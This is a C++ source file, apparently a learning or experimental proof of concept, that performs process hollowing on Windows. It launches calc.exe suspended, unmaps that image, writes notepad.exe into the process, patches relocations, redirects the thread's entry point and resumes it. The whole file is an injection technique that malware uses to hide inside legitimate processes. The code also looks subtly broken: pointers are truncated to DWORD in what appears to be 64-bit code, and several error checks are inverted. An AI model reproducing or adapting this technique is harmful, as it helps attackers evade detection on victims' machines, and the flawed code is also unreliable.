// ProcessHollowing.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <iostream>
#include <winternl.h>
#include <stdio.h>
#include <memoryapi.h>

using namespace std;

using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);

typedef NTSTATUS(WINAPI* _NtQueryInformationProcess)(
	HANDLE ProcessHandle,
	DWORD ProcessInformationClass,
	PVOID ProcessInformation,
	DWORD ProcessInformationLength,
	PDWORD ReturnLength
	);

typedef int(__cdecl* MYPROC)(LPCWSTR);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

typedef struct _myPEB {
	BYTE                          Reserved1[2];
	BYTE                          BeingDebugged;
	BYTE                          Reserved2[1];
	PVOID                         Reserved3;
	PVOID					ImageBaseAddress;
	PPEB_LDR_DATA                 Ldr;
	PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
	PVOID                         Reserved4[3];
	PVOID                         AtlThunkSListPtr;
	PVOID                         Reserved5;
	ULONG                         Reserved6;
	PVOID                         Reserved7;
	ULONG                         Reserved8;
	ULONG                         AtlThunkSListPtr32;
	PVOID                         Reserved9[45];
	BYTE                          Reserved10[96];
	PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
	BYTE                          Reserved11[128];
	PVOID                         Reserved12[1];
	ULONG                         SessionId;
} myPEB, * myPPEB;

typedef struct _myPROCESS_BASIC_INFORMATION {
	NTSTATUS ExitStatus;
	myPPEB PebBaseAddress;
	ULONG_PTR AffinityMask;
	KPRIORITY BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;
} myPROCESS_BASIC_INFORMATION;

int main()
{
	// create destination process - this is the process to be hollowed out
	HANDLE hProcess;
	HANDLE hThread;
	LPSTARTUPINFOA si = new STARTUPINFOA();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
	myPROCESS_BASIC_INFORMATION* pbi = new myPROCESS_BASIC_INFORMATION();
	DWORD returnLength = 0;
	BOOL bCreateProcess = NULL;
	CreateProcessA(NULL, (LPSTR)"C:/Windows/System32/calc.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
	HANDLE destProcess = pi->hProcess;

	// Locating the base address of destination image by acquiring the address of the PEB and reading it
	//PPEB pPEB = ReadRemotePEB(destProcess);

	// Image base is used to read the NT headers
	//PLOADED_IMAGE pImage = ReadRemoteImage(destProcess, pPEB->ImageBaseAddress);

	// get destination imageBase offset address from the PEB
	HMODULE hNTDLL = GetModuleHandleA("ntdll");
	FARPROC fpNtQueryInformationProcess = GetProcAddress(hNTDLL, "NtQueryInformationProcess");
	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
	NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(myPROCESS_BASIC_INFORMATION), &returnLength);
	//ULONG PebBase = (ULONG)pbi->PebBaseAddress;
	//PVOID pebImageBaseOffset = pbi->PebBaseAddress->ImageBaseAddress;

	if (NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(myPROCESS_BASIC_INFORMATION), &returnLength)) {
		printf("Failed to get the imageBase offset :( , GLE=%u", GetLastError());
	}
	printf("1\n");
	
     // get destination imageBaseAddress
	LPVOID destImageBase = 0;
	SIZE_T bytesRead = NULL;
	sizeof(ULONG);
	//LPCVOID ptrPebImageBaseOffset = (LPCVOID)pebImageBaseOffset;
	ReadProcessMemory(destProcess, pbi->PebBaseAddress->ImageBaseAddress, &destImageBase, 8, &bytesRead);
	printf("2, GLE=%u, bytesRead=%u\n", GetLastError(), bytesRead);
     // read source file - this is the file that will be executed inside the hollowed process
     HANDLE sourceFile = CreateFileA("C:/Windows/System32/notepad.exe", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
     //HANDLE sourceFile = CreateFileA("C:/Windows/syswow64/notepad.exe", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	printf("3 GLE=%u\n", GetLastError());
	DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
	printf("31 GLE=%u", GetLastError());
	SIZE_T fileBytesRead = 0;
	LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
	printf("32 GLE=%u", GetLastError());
	ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);
	printf("33 GLE=%u", GetLastError());
	
	// get source image size
	PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
	PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
	SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;
	printf("waeasd GLE=%u", GetLastError());
	// carve out the destination image
     NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
	printf("ntunmap GLE=%u", GetLastError());
	myNtUnmapViewOfSection(destProcess, destImageBase);
	if (myNtUnmapViewOfSection) {
		printf("Carving failed :( , GLE=%u", GetLastError());
	}
	printf("4 GLE=%u", GetLastError());

	// allocate new memory in destination image for the source image
	LPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	destImageBase = newDestImageBase;
	if (!newDestImageBase) {
		printf("Allocating failed , GLE=%u", GetLastError());
	}
	printf("5");
	// get delta between sourceImageBaseAddress and destinationImageBaseAddress
	DWORD deltaImageBase = (DWORD)destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase;

	// set sourceImageBase to destImageBase and copy the source Image headers to the destination image
	sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
	WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
	printf("WriteProcessMemory , GLE=%u", GetLastError());
	printf("6");
	// get pointer to first source image section
	PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
	PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;
	int err = GetLastError();

	// copy source image sections to destination
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress);
		PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
		WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
		printf("WriteProcessMemory%u , GLE=%u", i, GetLastError());
		sourceImageSection++;
	}

	// get address of the relocation table
	IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	// patch the binary with relocations
	sourceImageSection = sourceImageSectionOld;
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		BYTE* relocSectionName = (BYTE*)".reloc";
		if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0)
		{
			sourceImageSection++;
			continue;
		}

		DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
		DWORD relocationOffset = 0;

		while (relocationOffset < relocationTable.Size) {
			PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
			relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
			DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);

			for (DWORD y = 0; y < relocationEntryCount; y++)
			{
				relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

				if (relocationEntries[y].Type == 0)
				{
					continue;
				}

				DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
				DWORD patchedBuffer = 0;
				ReadProcessMemory(destProcess, (LPCVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
				printf("ReadProcessMemory , GLE=%u", GetLastError());
				patchedBuffer += deltaImageBase;

				WriteProcessMemory(destProcess, (PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &fileBytesRead);
				int a = GetLastError();
				printf(" d , GLE=%u", a);
			}
		}
	}

	// get context of the dest process thread
	LPCONTEXT context = new CONTEXT();
	context->ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi->hThread, context);
	if (!GetThreadContext(pi->hThread, context)) {
		printf("Error getting context");
		return 0;
	}

	// update dest image entry point to the new entry point of the source image and resume dest image thread
	DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
	context->Rax = patchedEntryPoint;
	SetThreadContext(pi->hThread, context);
	if (SetThreadContext(pi->hThread, context)) {
		printf("Error setting context");
		return 0;
	}
	ResumeThread(pi->hThread);
	
	system("PAUSE");
	return 0;

}
